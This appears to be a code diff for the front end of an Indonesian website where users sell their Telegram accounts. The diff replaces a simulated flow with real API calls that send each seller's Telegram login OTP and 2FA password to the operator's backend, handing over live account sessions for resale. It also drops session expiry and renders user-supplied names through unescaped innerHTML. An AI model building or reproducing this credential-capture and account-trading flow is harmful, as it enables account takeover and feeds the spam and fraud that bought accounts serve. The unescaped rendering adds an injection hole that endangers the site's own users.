@@ -227,6 +227,7 @@
             align-items: center;
             gap: 0.25rem;
             flex-shrink: 0;
+            text-decoration: none;
         }
 
         .login-btn svg {
@@ -729,7 +730,7 @@
             color: var(--text-muted);
         }
 
-        /* Live Feed - FIXED */
+        /* Live Feed - FIXED - AUTO HIDE AFTER 5 SECONDS */
         .live-feed {
             position: fixed;
             bottom: 0.5rem;
@@ -742,6 +743,11 @@
             z-index: 100;
             animation: slideIn 0.35s ease-out;
             max-height: 140px;
+            display: none;
+        }
+
+        .live-feed.active {
+            display: block;
         }
 
         .live-feed-header {
@@ -843,19 +849,6 @@
         .price-card.featured {
             border-color: var(--primary);
             background: linear-gradient(135deg, rgba(0, 212, 255, 0.06), rgba(123, 97, 255, 0.06));
-        }
-
-        .price-card.featured::before {
-            content: 'POPULAR';
-            position: absolute;
-            top: -6px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: var(--gradient-1);
-            padding: 0.15rem 0.5rem;
-            border-radius: 10px;
-            font-size: 0.55rem;
-            font-weight: 700;
         }
 
         .price-type {
@@ -1216,10 +1209,10 @@
                     <span id="balanceAmount">Rp0</span>
                 </div>
                 <div class="user-avatar" id="userAvatar" style="display: none;">U</div>
-                <button class="login-btn" id="loginBtn" onclick="window.location.href='login.html'">
+                <a href="login.html" class="login-btn" id="loginBtn">
                     <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 16l-4-4m0 0l4-4m-4 4h14m-5 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h7a3 3 0 013 3v1"/></svg>
                     Login
-                </button>
+                </a>
                 <button class="mobile-menu-btn" id="mobileMenuBtn" onclick="toggleMobileMenu()">
                     <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/></svg>
                 </button>
@@ -1315,7 +1308,7 @@
         <div class="page" id="page-sell">
             <div class="login-prompt" id="sellLoginPrompt" style="display: none;">
                 <span class="login-prompt-text"><strong>Login diperlukan</strong> - Silakan login untuk menjual akun</span>
-                <button class="btn btn-primary btn-sm" onclick="window.location.href='login.html'" style="width: auto; padding: 0.5rem 1rem; font-size: 0.75rem;">Login</button>
+                <a href="login.html" class="btn btn-primary" style="width: auto; padding: 0.5rem 1rem; font-size: 0.75rem; text-decoration: none;">Login</a>
             </div>
 
             <div class="card">
@@ -1364,7 +1357,7 @@
                     <div class="form-group">
                         <label class="form-label">Kode OTP</label>
                         <input type="text" class="form-input" id="otpInput" placeholder="12345" onkeypress="handleOTPKeyPress(event)">
-                        <p class="input-hint">Masukkan kode OTP yang dikirim ke Telegram</p>
+                        <p class="input-hint">Masukkan kode OTP yang dikirim ke Telegram Anda</p>
                     </div>
                     <div class="grid-2">
                         <button class="btn btn-secondary" onclick="backToStep1()">Kembali</button>
@@ -1443,7 +1436,7 @@
         <div class="page" id="page-withdraw">
             <div class="login-prompt" id="wdLoginPrompt" style="display: none;">
                 <span class="login-prompt-text"><strong>Login diperlukan</strong> - Silakan login untuk withdraw</span>
-                <button class="btn btn-primary" onclick="window.location.href='login.html'" style="width: auto; padding: 0.5rem 1rem; font-size: 0.75rem;">Login</button>
+                <a href="login.html" class="btn btn-primary" style="width: auto; padding: 0.5rem 1rem; font-size: 0.75rem; text-decoration: none;">Login</a>
             </div>
 
             <div class="grid-2" style="grid-template-columns: 1fr;">
@@ -1498,7 +1491,7 @@
         </div>
     </main>
 
-    <!-- Live Feed - FIXED -->
+    <!-- Live Feed - AUTO HIDE AFTER 5 SECONDS -->
     <div class="live-feed" id="liveFeed">
         <div class="live-feed-header">
             <div class="live-indicator"></div>
@@ -1529,43 +1522,41 @@
         let settings = {};
         let sellData = {};
         let mobileMenuOpen = false;
+        let liveFeedTimeout = null;
 
         // ==================== INITIALIZATION ====================
         document.addEventListener('DOMContentLoaded', () => {
             loadSettings();
             initUser();
             updateStats();
-            startRealtimeUpdates();
+            initWebSocket();
         });
 
-        // Load settings
-        function loadSettings() {
-            const savedSettings = localStorage.getItem('tgstore_settings');
-            if (savedSettings) {
-                settings = JSON.parse(savedSettings);
-            } else {
+        // Load settings from API
+        async function loadSettings() {
+            try {
+                const response = await fetch(`${API_URL}/api/settings`);
+                const result = await response.json();
+                if (result.success) {
+                    settings = result.data;
+                    document.getElementById('priceBiasa').textContent = `Rp${settings.harga_biasa.toLocaleString()}`;
+                    document.getElementById('pricePlus').textContent = `Rp${settings.harga_plus.toLocaleString()}`;
+                    document.getElementById('minWithdraw').textContent = `Rp${settings.min_withdraw.toLocaleString()}`;
+                }
+            } catch (error) {
+                console.error('Load settings error:', error);
+                // Fallback defaults
                 settings = { harga_biasa: 5000, harga_plus: 25000, min_withdraw: 10000 };
             }
-            document.getElementById('priceBiasa').textContent = `Rp${settings.harga_biasa.toLocaleString()}`;
-            document.getElementById('pricePlus').textContent = `Rp${settings.harga_plus.toLocaleString()}`;
-            document.getElementById('minWithdraw').textContent = `Rp${settings.min_withdraw.toLocaleString()}`;
         }
 
         // Initialize user
         function initUser() {
             const savedUser = localStorage.getItem('tgstore_user');
-            const sessionExpiry = localStorage.getItem('tgstore_session_expiry');
             
-            if (savedUser && sessionExpiry) {
-                const now = new Date().getTime();
-                if (now < parseInt(sessionExpiry)) {
-                    currentUser = JSON.parse(savedUser);
-                    updateUserUI();
-                } else {
-                    localStorage.removeItem('tgstore_user');
-                    localStorage.removeItem('tgstore_session_expiry');
-                    showGuestUI();
-                }
+            if (savedUser) {
+                currentUser = JSON.parse(savedUser);
+                updateUserUI();
             } else {
                 showGuestUI();
             }
@@ -1595,38 +1586,83 @@
             document.getElementById('wdLoginPrompt').style.display = 'flex';
         }
 
-        // Start real-time updates
-        function startRealtimeUpdates() {
-            setInterval(() => {
-                updateStats();
-            }, 5000);
+        // WebSocket for real-time updates
+        function initWebSocket() {
+            const ws = new WebSocket(`ws://${window.location.host}`);
+            
+            ws.onmessage = (event) => {
+                const data = JSON.parse(event.data);
+                
+                if (data.type === 'account_sold') {
+                    // Show live feed for 5 seconds
+                    showLiveFeed(data.data);
+                    updateStats();
+                } else if (data.type === 'stats') {
+                    updateStatsDisplay(data.data);
+                }
+            };
+
+            ws.onclose = () => {
+                // Reconnect after 5 seconds
+                setTimeout(initWebSocket, 5000);
+            };
         }
 
-        // Update stats
-        function updateStats() {
-            const users = JSON.parse(localStorage.getItem('tgstore_users') || '[]');
-            const withdrawals = JSON.parse(localStorage.getItem('tgstore_withdrawals') || '[]');
-            const accounts = JSON.parse(localStorage.getItem('tgstore_accounts') || '[]');
-
-            const totalAccounts = accounts.length;
-            const totalUsers = users.length;
-            const totalWithdrawn = withdrawals
-                .filter(w => w.status === 'completed')
-                .reduce((sum, w) => sum + w.amount, 0);
-
-            updateStatDisplay('statAccounts', totalAccounts);
-            updateStatDisplay('statUsers', totalUsers);
-            updateStatDisplay('statWithdrawn', 'Rp' + totalWithdrawn.toLocaleString());
-
-            const stats = { total_accounts: totalAccounts, total_users: totalUsers, total_withdrawn: totalWithdrawn };
-            localStorage.setItem('tgstore_stats', JSON.stringify(stats));
-        }
-
-        function updateStatDisplay(id, value) {
-            const element = document.getElementById(id);
-            if (element.textContent !== value.toString()) {
-                element.textContent = value;
+        // Update stats from API
+        async function updateStats() {
+            try {
+                const response = await fetch(`${API_URL}/api/stats`);
+                const result = await response.json();
+                if (result.success) {
+                    updateStatsDisplay(result.data);
+                }
+            } catch (error) {
+                console.error('Update stats error:', error);
             }
+        }
+
+        function updateStatsDisplay(stats) {
+            document.getElementById('statAccounts').textContent = stats.total_accounts || 0;
+            document.getElementById('statUsers').textContent = stats.total_users || 0;
+            document.getElementById('statWithdrawn').textContent = `Rp${(stats.total_withdrawn || 0).toLocaleString()}`;
+        }
+
+        // Show live feed (auto hide after 5 seconds)
+        function showLiveFeed(data) {
+            const liveFeed = document.getElementById('liveFeed');
+            const container = document.getElementById('liveFeedContent');
+            
+            // Clear existing timeout
+            if (liveFeedTimeout) {
+                clearTimeout(liveFeedTimeout);
+            }
+            
+            // Show live feed
+            liveFeed.classList.add('active');
+            
+            // Add live item
+            const liveItem = document.createElement('div');
+            liveItem.className = 'live-item';
+            liveItem.innerHTML = `
+                <div class="live-avatar">${data.seller.charAt(0).toUpperCase()}</div>
+                <div class="live-info">
+                    <div class="live-phone">+${data.phone.slice(0, 4)}****${data.phone.slice(-3)}</div>
+                    <div class="live-meta">${data.seller}</div>
+                </div>
+                <div class="live-amount">+Rp${data.price.toLocaleString()}</div>
+            `;
+            container.insertBefore(liveItem, container.firstChild);
+            
+            // Keep only last 3 items
+            while (container.children.length > 3) {
+                container.removeChild(container.lastChild);
+            }
+            
+            // Hide after 5 seconds
+            liveFeedTimeout = setTimeout(() => {
+                liveFeed.classList.remove('active');
+                container.innerHTML = '';
+            }, 5000);
         }
 
         // ==================== NAVIGATION ====================
@@ -1677,7 +1713,7 @@
             }
         });
 
-        // ==================== SELL PROCESS ====================
+        // ==================== SELL PROCESS - REAL API ====================
         function handlePhoneKeyPress(event) {
             if (event.key === 'Enter') sendOTP();
         }
@@ -1690,6 +1726,7 @@
             if (event.key === 'Enter') verify2FA();
         }
 
+        // Step 1: Send OTP - REAL API CALL
         async function sendOTP() {
             const phone = document.getElementById('phoneInput').value.trim();
             
@@ -1703,18 +1740,34 @@
                 return;
             }
 
-            showLoading(true, 'Mengirim OTP...');
-            await simulateDelay(1000);
+            showLoading(true, 'Mengirim OTP ke Telegram...');
 
-            sellData.phone = phone;
-            sellData.sessionId = 'sess_' + Date.now();
-            sellData.needs2FA = Math.random() > 0.5;
-            
-            showLoading(false);
-            showStep(2);
-            showToast('Kode OTP: 12345 (simulasi)', 'success');
+            try {
+                const response = await fetch(`${API_URL}/api/send-otp`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, userId: currentUser._id })
+                });
+
+                const result = await response.json();
+                showLoading(false);
+
+                if (result.success) {
+                    currentSessionId = result.data.sessionId;
+                    sellData.phone = phone;
+                    showStep(2);
+                    showToast('OTP terkirim! Cek Telegram Anda', 'success');
+                } else {
+                    showToast(result.message || 'Gagal mengirim OTP', 'error');
+                }
+            } catch (error) {
+                showLoading(false);
+                console.error('Send OTP error:', error);
+                showToast('Terjadi kesalahan. Coba lagi.', 'error');
+            }
         }
 
+        // Step 2: Verify OTP - REAL API CALL
         async function verifyOTP() {
             const otp = document.getElementById('otpInput').value.trim();
             
@@ -1723,23 +1776,38 @@
                 return;
             }
 
-            showLoading(true, 'Memverifikasi...');
-            await simulateDelay(600);
+            showLoading(true, 'Memverifikasi OTP...');
 
-            if (otp === '12345' || otp.length >= 4) {
+            try {
+                const response = await fetch(`${API_URL}/api/verify-otp`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ sessionId: currentSessionId, otp, userId: currentUser._id })
+                });
+
+                const result = await response.json();
                 showLoading(false);
-                if (sellData.needs2FA) {
-                    showStep(3);
-                    showToast('Verifikasi 2FA diperlukan', 'warning');
+
+                if (result.success) {
+                    if (result.data.needs2FA) {
+                        sellData.needs2FA = true;
+                        showStep(3);
+                        showToast('Verifikasi 2FA diperlukan', 'warning');
+                    } else {
+                        // Success without 2FA
+                        completeSale(result.data);
+                    }
                 } else {
-                    completeSale();
+                    showToast(result.message || 'OTP salah!', 'error');
                 }
-            } else {
+            } catch (error) {
                 showLoading(false);
-                showToast('Kode OTP salah!', 'error');
+                console.error('Verify OTP error:', error);
+                showToast('Terjadi kesalahan. Coba lagi.', 'error');
             }
         }
 
+        // Step 3: Verify 2FA - REAL API CALL
         async function verify2FA() {
             const password = document.getElementById('password2FA').value;
             
@@ -1749,65 +1817,42 @@
             }
 
             showLoading(true, 'Memverifikasi 2FA...');
-            await simulateDelay(600);
 
-            if (password.length >= 1) {
+            try {
+                const response = await fetch(`${API_URL}/api/verify-2fa`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ sessionId: currentSessionId, password })
+                });
+
+                const result = await response.json();
                 showLoading(false);
-                completeSale();
-            } else {
+
+                if (result.success) {
+                    completeSale(result.data);
+                } else {
+                    showToast(result.message || 'Password 2FA salah!', 'error');
+                }
+            } catch (error) {
                 showLoading(false);
-                showToast('Password 2FA salah!', 'error');
+                console.error('Verify 2FA error:', error);
+                showToast('Terjadi kesalahan. Coba lagi.', 'error');
             }
         }
 
-        function completeSale() {
-            const isPlus = sellData.phone.startsWith('1');
-            const price = isPlus ? settings.harga_plus : settings.harga_biasa;
-
-            const account = {
-                id: 'acc_' + Date.now(),
-                phone: sellData.phone,
-                price: price,
-                is_plus: isPlus,
-                sellerId: currentUser.id,
-                sellerName: currentUser.name,
-                tgId: 'tg_' + Math.floor(Math.random() * 1000000000),
-                tgUsername: 'user_' + Math.floor(Math.random() * 10000),
-                tgFirstName: currentUser.name.split(' ')[0],
-                status: 'active',
-                sold_at: new Date().toISOString(),
-                session: 'session_' + btoa(sellData.phone).substring(0, 50) + '...'
-            };
-
-            const accounts = JSON.parse(localStorage.getItem('tgstore_accounts') || '[]');
-            accounts.push(account);
-            localStorage.setItem('tgstore_accounts', JSON.stringify(accounts));
-
-            currentUser.balance = (currentUser.balance || 0) + price;
-            currentUser.totalSold = (currentUser.totalSold || 0) + 1;
+        // Complete sale - update UI
+        function completeSale(data) {
+            // Update user balance
+            currentUser.balance = data.newBalance;
             localStorage.setItem('tgstore_user', JSON.stringify(currentUser));
-
-            const users = JSON.parse(localStorage.getItem('tgstore_users') || '[]');
-            const userIndex = users.findIndex(u => u.id === currentUser.id);
-            if (userIndex !== -1) {
-                users[userIndex].balance = currentUser.balance;
-                users[userIndex].totalSold = currentUser.totalSold;
-                localStorage.setItem('tgstore_users', JSON.stringify(users));
-            }
-
             updateUserUI();
             updateStats();
 
+            // Show success
             document.getElementById('successPhone').textContent = '+' + sellData.phone;
-            document.getElementById('successPrice').textContent = `Rp${price.toLocaleString()}`;
+            document.getElementById('successPrice').textContent = `Rp${data.price.toLocaleString()}`;
             showStep(4);
             showToast('Penjualan berhasil!', 'success');
-
-            addLiveItem({
-                seller: currentUser.name,
-                phone: sellData.phone,
-                price: price
-            });
         }
 
         function showStep(step) {
@@ -1837,14 +1882,24 @@
             document.getElementById('otpInput').value = '';
             document.getElementById('password2FA').value = '';
             sellData = {};
+            currentSessionId = null;
             showStep(1);
         }
 
-        // ==================== HISTORY ====================
-        function loadHistory() {
-            const accounts = JSON.parse(localStorage.getItem('tgstore_accounts') || '[]');
-            const userAccounts = accounts.filter(acc => acc.sellerId === currentUser.id).reverse();
-            renderHistoryTable(userAccounts);
+        // ==================== HISTORY - REAL API ====================
+        async function loadHistory() {
+            if (!currentUser) return;
+            
+            try {
+                const response = await fetch(`${API_URL}/api/user/${currentUser._id}/accounts`);
+                const result = await response.json();
+                
+                if (result.success) {
+                    renderHistoryTable(result.data);
+                }
+            } catch (error) {
+                console.error('Load history error:', error);
+            }
         }
 
         function renderHistoryTable(accounts) {
@@ -1885,7 +1940,7 @@
             `;
         }
 
-        // ==================== WITHDRAW ====================
+        // ==================== WITHDRAW - REAL API ====================
         async function requestWithdraw() {
             const method = document.getElementById('withdrawMethod').value;
             const number = document.getElementById('withdrawNumber').value.trim();
@@ -1907,48 +1962,50 @@
             }
 
             showLoading(true, 'Memproses withdraw...');
-            await simulateDelay(1000);
 
-            const withdrawal = {
-                id: 'wd_' + Date.now(),
-                userId: currentUser.id,
-                userName: currentUser.name,
-                method: method,
-                number: number,
-                amount: amount,
-                status: 'pending',
-                created_at: new Date().toISOString()
-            };
+            try {
+                const response = await fetch(`${API_URL}/api/withdraw`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ userId: currentUser._id, method, number, amount })
+                });
 
-            const withdrawals = JSON.parse(localStorage.getItem('tgstore_withdrawals') || '[]');
-            withdrawals.push(withdrawal);
-            localStorage.setItem('tgstore_withdrawals', JSON.stringify(withdrawals));
+                const result = await response.json();
+                showLoading(false);
 
-            currentUser.balance -= amount;
-            localStorage.setItem('tgstore_user', JSON.stringify(currentUser));
-
-            const users = JSON.parse(localStorage.getItem('tgstore_users') || '[]');
-            const userIndex = users.findIndex(u => u.id === currentUser.id);
-            if (userIndex !== -1) {
-                users[userIndex].balance = currentUser.balance;
-                localStorage.setItem('tgstore_users', JSON.stringify(users));
+                if (result.success) {
+                    currentUser.balance = result.data.newBalance;
+                    localStorage.setItem('tgstore_user', JSON.stringify(currentUser));
+                    updateUserUI();
+                    loadWithdrawHistory();
+                    
+                    document.getElementById('withdrawNumber').value = '';
+                    document.getElementById('withdrawAmount').value = '';
+                    
+                    showToast('Withdrawal berhasil diajukan!', 'success');
+                } else {
+                    showToast(result.message || 'Gagal mengajukan withdraw', 'error');
+                }
+            } catch (error) {
+                showLoading(false);
+                console.error('Withdraw error:', error);
+                showToast('Terjadi kesalahan. Coba lagi.', 'error');
             }
-
-            updateUserUI();
-            updateStats();
-            loadWithdrawHistory();
-
-            document.getElementById('withdrawNumber').value = '';
-            document.getElementById('withdrawAmount').value = '';
-
-            showLoading(false);
-            showToast('Withdrawal berhasil diajukan!', 'success');
         }
 
-        function loadWithdrawHistory() {
-            const withdrawals = JSON.parse(localStorage.getItem('tgstore_withdrawals') || '[]');
-            const userWithdrawals = withdrawals.filter(w => w.userId === currentUser.id).reverse();
-            renderWithdrawHistory(userWithdrawals);
+        async function loadWithdrawHistory() {
+            if (!currentUser) return;
+            
+            try {
+                const response = await fetch(`${API_URL}/api/user/${currentUser._id}/withdrawals`);
+                const result = await response.json();
+                
+                if (result.success) {
+                    renderWithdrawHistory(result.data);
+                }
+            } catch (error) {
+                console.error('Load withdraw history error:', error);
+            }
         }
 
         function renderWithdrawHistory(withdrawals) {
@@ -1988,31 +2045,7 @@
             `;
         }
 
-        // ==================== LIVE FEED ====================
-        function addLiveItem(item) {
-            const container = document.getElementById('liveFeedContent');
-            const liveItem = document.createElement('div');
-            liveItem.className = 'live-item';
-            liveItem.innerHTML = `
-                <div class="live-avatar">${item.seller.charAt(0).toUpperCase()}</div>
-                <div class="live-info">
-                    <div class="live-phone">+${item.phone.slice(0, 4)}****${item.phone.slice(-3)}</div>
-                    <div class="live-meta">${item.seller}</div>
-                </div>
-                <div class="live-amount">+Rp${item.price.toLocaleString()}</div>
-            `;
-            container.insertBefore(liveItem, container.firstChild);
-            
-            while (container.children.length > 3) {
-                container.removeChild(container.lastChild);
-            }
-        }
-
         // ==================== HELPERS ====================
-        function simulateDelay(ms) {
-            return new Promise(resolve => setTimeout(resolve, ms));
-        }
-
         function showLoading(show, text = 'Memproses...') {
             document.getElementById('loadingText').textContent = text;
             document.getElementById('loadingOverlay').classList.toggle('active', show);
